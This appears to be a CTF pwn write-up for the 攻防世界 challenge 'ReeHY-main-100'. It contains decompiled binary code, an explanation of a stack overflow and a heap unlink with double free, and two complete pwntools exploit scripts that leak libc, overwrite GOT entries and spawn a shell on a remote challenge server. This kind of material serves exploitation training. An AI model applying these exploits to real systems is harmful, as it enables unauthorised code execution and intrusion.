# Challenges 100 Week 2


# Challenges_100-Week_2

|        Challenges         |            Tricks            |
| :-----------------------: | :--------------------------: |
| 攻防世界-4-ReeHY-main-100 | `ROP`/`unlink`+`double free` |

<!-- more -->

# 4-ReeHY-main-100

## checksec

```shell
[*] '/home/niebelungen/Desktop/pwn/4-ReeHY-main-100/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

```c
int __fastcall create(__int64 a1, __int64 a2)
{
  int result; // eax
  char buf[128]; // [rsp+0h] [rbp-90h] BYREF
  void *dest; // [rsp+80h] [rbp-10h]
  int v5; // [rsp+88h] [rbp-8h]
  size_t nbytes; // [rsp+8Ch] [rbp-4h]

  result = chunk_num;
  if ( chunk_num <= 4 )
  {
    puts("Input size");
    result = ((__int64 (__fastcall *)(const char *, __int64))choice)("Input size", a2);
    LODWORD(nbytes) = result;
    if ( result <= 0x1000 )
    {
      puts("Input cun");
      result = ((__int64 (__fastcall *)(const char *, __int64))choice)("Input cun", a2);
      v5 = result;
      if ( result <= 4 )
      {
        dest = malloc((int)nbytes);
        puts("Input content");
        if ( (int)nbytes > 112 )
        {
          read(0, dest, (unsigned int)nbytes);
        }
        else
        {
          read(0, buf, (unsigned int)nbytes);
          memcpy(dest, buf, (int)nbytes);
        }
        *(_DWORD *)(size_t + 4LL * v5) = nbytes;
        *((_QWORD *)&position + 2 * v5) = dest;
        signal[4 * v5] = 1;
        ++chunk_num;
        result = fflush(stdout);
      }
    }
  }
  return result;
}

__int64 dele()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Chose one to dele");
  result = choice();
  v1 = result;
  if ( (int)result <= 4 )
  {
    free(*((void **)&position + 2 * (int)result));
    signal[4 * v1] = 0;
    puts("dele success!");
    result = (unsigned int)--chunk_num;
  }
  return result;
}
```

## ROP

首先看使用常规ROP，在create处，if条件和read得nbytes产生明显的溢出。

## exp-ROP

```python
from pwn import *
from LibcSearcher import LibcSearcher
leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
context.log_level="DEBUG"
context.arch="amd64"
local=0
binary='./pwn'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',34354)
elf = ELF(binary,checksec=False)
#libc=ELF('./ctflibc.so.6')
pop_rdi=0x400da3
main_addr=0x400c8c
p.sendlineafter('$ ','1234')
p.sendlineafter('$ ','1')
p.sendlineafter('Input size\n','-1')
p.sendlineafter('Input cun\n','1')
payload='a'*0x88+'\x00'*0x8+'a'*0x8+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main_addr)
p.sendlineafter('Input content',payload)

p.recv()
puts_addr=u64(p.recv()[:6].ljust(8,'\x00'))
log.success('puts_addr:'+hex(puts_addr))
libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')
system=libc_base+libc.dump('system')
bin_sh=libc_base+libc.dump('str_bin_sh')
log.success('libc_base:'+hex(libc_base))

p.sendline('Niebelungen')
p.sendlineafter('$ ','1')
p.sendlineafter('Input size\n','-1')
p.sendlineafter('Input cun\n','1')
payload='a'*0x88+'\x00'*0x8+'a'*0x8+p64(pop_rdi)+p64(bin_sh)+p64(system)
p.sendlineafter('Input content',payload)

p.interactive()
```

## unlink

`0x6020E0`处储存着申请的堆的指针和状态信息，经过调试，我们可以申请到这个数组附近的chunk，所以我们通过unlink来修改这个数组的信息，使某一指针指向got表，从而对got表进行修改。

首先申请一个chunk，用来写‘/bin/sh’。然后申请三个size>fastbin的chunk1，chunk2，chunk3，将chunk2和chunk3都free掉。之后申请一个size等于chunk2+chunk3。这样我们实际获得了chunk3头部的控制权。在chunk2的数据域中构造fake_chunk，修改chunk3的头部进行unlink。

unlink后：

```text
==> |0			| <== ptr - 0x18
	|			|
	|			|
	|ptr - 0x18 | <== ptr
```

这时修改`*ptr`为`free@got`

```text
|padding |
|padding |
|padding |
|free@got| <== ptr
```

此时`ptr`指向`free@got`，向ptr中写数据就是修改`free@got`

## exp-unlink

```python
from pwn import *
from LibcSearcher import LibcSearcher
leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./pwn'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',31890)
elf = ELF(binary,checksec=False)
atoi_got=elf.got['atoi']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
puts_got = elf.got['puts']
heap = 0x602100

def create(size,index,content):
    p.sendlineafter('$ ','1')
    p.sendlineafter('Input size\n',str(size))
    p.sendlineafter('Input cun\n',str(index))
    p.sendafter('Input content\n',content)

def delete(index):
    p.sendlineafter('$ ','2')
    p.sendlineafter('Chose one to dele\n',str(index))

def edit(index,content):
    p.sendlineafter('$ ','3')
    p.sendlineafter('Chose one to edit\n',str(index))
    p.sendafter('Input the content\n',content)

p.sendlineafter('$ ','Niebelungen')
create(0x200,0,'/bin/sh\x00')
create(0x200,1,'first')
create(0x200,2,'second')
create(0x200,3,'third')
#gdb.attach(p)
delete(3)
delete(2)

payload=p64(0)+p64(0x201)+p64(heap-0x18)+p64(heap-0x10)+'a'*(0x200-0x20)+p64(0x200)+p64(0x200)
create(0x400,2,payload)
#unlink
delete(3)
payload=0x18*'1'+p64(free_got)+p64(1)+p64(atoi_got)
edit(2,payload)
edit(2,p64(puts_plt))
delete(3)
atoi_addr=u64(p.recvn(6).ljust(8,'\x00'))
libc=LibcSearcher('atoi',atoi_addr)
offset=atoi_addr-libc.dump('atoi')
system_addr=offset+libc.dump('system')
edit(2,p64(system_addr))
delete(0)

p.interactive()
```

